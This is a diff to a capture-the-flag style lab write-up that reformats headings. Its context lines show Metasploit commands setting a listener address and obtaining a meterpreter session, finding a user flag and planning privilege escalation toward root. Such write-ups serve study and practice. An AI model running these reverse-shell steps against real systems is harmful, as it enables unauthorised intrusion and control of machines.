@@ -39,7 +39,11 @@ msf >set LHOST 10.17.17.19
 
 msf >run
 
-Now we get the meterpreter session 
+#### Now we get the meterpreter session 
+
+--------------------------
+# Now lets find the root.txt Flag
+
 
 ![[Pasted image 20251025184353.png]]
 
@@ -52,7 +56,7 @@ Found total 3 users
 So finally in the magnus user i found the user.txt flag
 
 ----------------
-Now lets find the root.txt Flag
+# Now lets find the root.txt Flag
 
 To do that we have to escalate priviellage
 
